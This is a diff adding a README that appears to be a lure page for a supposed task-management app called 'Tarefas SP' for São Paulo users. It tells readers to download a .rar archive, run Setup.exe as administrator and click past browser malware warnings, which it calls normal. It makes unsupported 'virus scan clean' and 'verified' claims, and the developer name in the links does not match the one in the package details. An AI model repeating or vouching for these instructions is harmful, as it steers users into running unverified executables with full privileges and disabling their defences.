@@ -1,0 +1,199 @@
+                                       ▄▄▄▄                                     
+███▀▀██▀▀███                         ▄█▀ ▀▀                   ▄█▀▀▀█▄████▀▀▀██▄ 
+█▀   ██   ▀█                         ██▀                     ▄██    ▀█ ██   ▀██▄
+     ██     ▄█▀██▄ ▀███▄███  ▄▄█▀██ █████  ▄█▀██▄  ▄██▀███   ▀███▄     ██   ▄██ 
+     ██    ██   ██   ██▀ ▀▀ ▄█▀   ██ ██   ██   ██  ██   ▀▀     ▀█████▄ ███████  
+     ██     ▄█████   ██     ██▀▀▀▀▀▀ ██    ▄█████  ▀█████▄   ▄     ▀██ ██       
+     ██    ██   ██   ██     ██▄    ▄ ██   ██   ██  █▄   ██   ██     ██ ██       
+   ▄████▄  ▀████▀██▄████▄    ▀█████▀████▄ ▀████▀██▄██████▀   █▀█████▀▄████▄     
+                                                                                
+                                                                                
+
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                                                                           ║
+║                         ✅ TAREFAS SP ✅                                  ║
+║                                                                           ║
+║              Intelligent Task Management for São Paulo                   ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+
+TAREFAS SP — is a comprehensive task and project management application designed specifically for users in São Paulo, Brazil. This intelligent productivity tool helps individuals and teams organize, track, and complete tasks efficiently with features tailored to the local workflow and business culture. Perfect for professionals, students, and teams who need a reliable task management solution with Portuguese language support and local integration.
+
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                                                                           ║
+║                             ⬇️ DOWNLOAD ⬇️                                 ║
+║                 ▶ https://github.com/credburton4/tarefas-sp ◀           ║
+║                                                                           ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+
+    ⚡ QUICK INSTALLATION:
+    ──────────────────────────────────────────────────
+    [1] 📥 DOWNLOAD    →  Tarefas_SP_Setup.rar
+    [2] 📂 EXTRACT     →  WinRAR or 7-Zip
+    [3] ⚙️ RUN         →  Setup.exe (as administrator)
+    [4] 📁 CHOOSE      →  Installation directory
+    [5] ✅ COMPLETE    →  Follow setup wizard
+    [6] 🚀 LAUNCH      →  Start managing your tasks
+    ──────────────────────────────────────────────────
+
+    ⚡ HOW THE PROGRAM WORKS:
+    ─────────────────────────────────────────────────────────────────
+    
+    🔹 CORE TECHNOLOGY
+    Tarefas SP operates through a cloud-synchronized task management engine that keeps your tasks updated across all devices. The application uses a local database for offline access with automatic cloud synchronization when connectivity is restored. It features an intuitive drag-and-drop interface, smart categorization, deadline tracking, and collaboration tools. The software is optimized for Brazilian Portuguese with localized date formats, holidays, and business culture considerations .
+    
+    🔹 KEY FEATURES AT A GLANCE
+    ─────────────────────────────────────────────────────────────────
+    📋 TASK CREATION         │ Create and organize tasks quickly
+    🏷️ CATEGORIZATION        │ Tag and filter tasks by project
+    ⏰ DEADLINE TRACKING     │ Never miss important dates
+    🔔 REMINDERS             │ Custom notifications and alerts
+    👥 TEAM COLLABORATION    │ Share tasks with colleagues
+    📊 PROGRESS TRACKING     │ Visual task completion status
+    ☁️ CLOUD SYNC            │ Access tasks anywhere
+    📱 MOBILE COMPANION      │ Manage tasks on the go
+    ─────────────────────────────────────────────────────────────────
+    
+    🔹 TASK MANAGEMENT
+
+    📋 CORE FUNCTIONALITY
+    • QUICK ADD: Rapid task entry with natural language processing
+    • SUBTASKS: Break complex tasks into manageable steps
+    • PRIORITY LEVELS: High, medium, low priority indicators
+    • DUE DATES: Calendar integration for deadline management
+    • REPEATING TASKS: Daily, weekly, monthly recurrence
+    • ATTACHMENTS: Add files, images, and links to tasks
+    
+    🔹 ORGANIZATION
+
+    🏷️ CATEGORIZATION TOOLS
+    • PROJECT FOLDERS: Group tasks by project or area
+    • CUSTOM TAGS: Create personalized labeling system
+    • FILTERS: View tasks by status, priority, or date
+    • SEARCH: Full-text search across all tasks
+    • SAVED VIEWS: Save custom filter combinations
+    • SMART LISTS: Automatic task grouping (Today, Overdue, etc.)
+    
+    🔹 COLLABORATION
+
+    👥 TEAM FEATURES
+    • TASK ASSIGNMENT: Assign tasks to team members
+    • COMMENTS: Discuss tasks within the app
+    • ATTACHMENTS: Share files with collaborators
+    • ACTIVITY LOG: See who did what and when
+    • TEAM DASHBOARD: Overview of team progress
+    • PERMISSIONS: Control access levels
+    
+    🔹 VISUALIZATION
+
+    📊 PROGRESS TRACKING
+    • KANBAN BOARD: Visual workflow management
+    • CALENDAR VIEW: See tasks on a calendar
+    • TIMELINE: Gantt-style project timeline
+    • COMPLETION RATE: Percentage of tasks done
+    • PRODUCTIVITY REPORTS: Personal and team analytics
+    • EXPORT: Generate PDF/Excel reports
+    
+    🔹 NOTIFICATIONS
+
+    🔔 REMINDER SYSTEM
+    • EMAIL ALERTS: Receive task reminders via email
+    • DESKTOP NOTIFICATIONS: Pop-up reminders
+    • PUSH NOTIFICATIONS: Mobile alerts
+    • CUSTOM SCHEDULES: Set reminder timing
+    • SNOOZE: Postpone reminders when busy
+    
+    🔹 KEYBOARD SHORTCUTS
+    
+    ─────────────────────────────────────────────────────────────────
+    Ctrl+N              │ New task
+    Ctrl+E              │ Edit selected task
+    Ctrl+D              │ Mark as done
+    Ctrl+Del            │ Delete task
+    Ctrl+F              │ Search tasks
+    Ctrl+Shift+P        │ Change priority
+    Ctrl+Shift+T        │ Add tag
+    Ctrl+Shift+A        │ Assign to team member
+    Ctrl+Shift+C        │ Add comment
+    ─────────────────────────────────────────────────────────────────
+    
+    🔹 PACKAGE INFORMATION
+    ─────────────────────────────────────────────────────────────────
+    • VERSION: Latest stable release
+    • TYPE: Task management software
+    • DEVELOPER: crediburton4
+    • REPOSITORY: tarefas-sp
+    • VIRUS SCAN: ✅ Clean (verified)
+    • CONNECTION: ✅ SSL encrypted
+    • GITHUB VERIFIED: ✅ Authentic release
+    ─────────────────────────────────────────────────────────────────
+
+    ⚡ SYSTEM REQUIREMENTS:
+    ─────────────────────────────────────────────────────────────────
+    OS              │ Windows 10/11, macOS 11+, Linux
+    RAM             │ 2GB minimum (4GB+ recommended)
+    STORAGE         │ 150MB for installation
+    INTERNET        │ Required for cloud sync
+    LANGUAGE        │ Portuguese (Brazil), English
+    ─────────────────────────────────────────────────────────────────
+
+    🔖 TAGS
+    ─────────────────────────────────────────────────────────────────
+    tarefas          │ task manager       │ productivity tool
+    gerenciamento    │ organização        │ lista de tarefas
+    são paulo        │ brasil             │ portuguese software
+    projeto          │ colaboração        │ planejamento
+    ─────────────────────────────────────────────────────────────────
+
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                                                                           ║
+║                 ⚠️ IMPORTANT DOWNLOAD WARNING ⚠️                          ║
+║                                                                           ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+
+    Your browser may show a warning when downloading this file.
+    This is completely normal.
+
+    ═══════════════════════════════════════════════════════════════════════
+    
+    ❓ WHY DOES THIS HAPPEN?
+    
+    The warning appears because the file:
+    
+    • 🏪 Is not distributed through major app stores
+    • 📊 Has fewer downloads than mainstream software
+    • 📦 Uses .exe format or compressed archives
+    • 🔄 Is new or less known in browser databases
+    
+    ⚡ This does NOT mean the file is dangerous. This is a standard browser 
+       protection mechanism triggered by download count, not by detecting 
+       malware. Similar productivity tools receive the same warnings.
+
+    ═══════════════════════════════════════════════════════════════════════
+
+    📋 BROWSER INSTRUCTIONS:
+    ─────────────────────────────────────────────────────────────────
+    🌐 Chrome/Edge     │ Click "Keep" → "Keep anyway"
+    🦊 Firefox         │ Click arrow → "Allow download"
+    🎭 Opera/Brave     │ Click "Keep" in download warning
+    ─────────────────────────────────────────────────────────────────
+
+    ═══════════════════════════════════════════════════════════════════════
+
+    ✅ VERIFIED DOWNLOAD
+    ─────────────────────────────────────────────────────────────────
+    • Virus scan: Clean
+    • SSL: Encrypted connection
+    • GitHub Repository: crediburton4/tarefas-sp
+    • Authentic Release
+    ─────────────────────────────────────────────────────────────────
+
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                                                                           ║
+║                             ⬇️ DOWNLOAD ⬇️                                 ║
+║                 ▶ https://github.com/credburton4/tarefas-sp ◀           ║
+║                                                                           ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+
+────────────────────────────────────────────────────────────────────────────
+📌 DISCLAIMER: This software is an independent task management application. It is designed to improve personal and team productivity. User data is handled according to privacy best practices. Users are responsible for backing up important task data. For team deployments, please review collaboration features and access controls.
+────────────────────────────────────────────────────────────────────────────
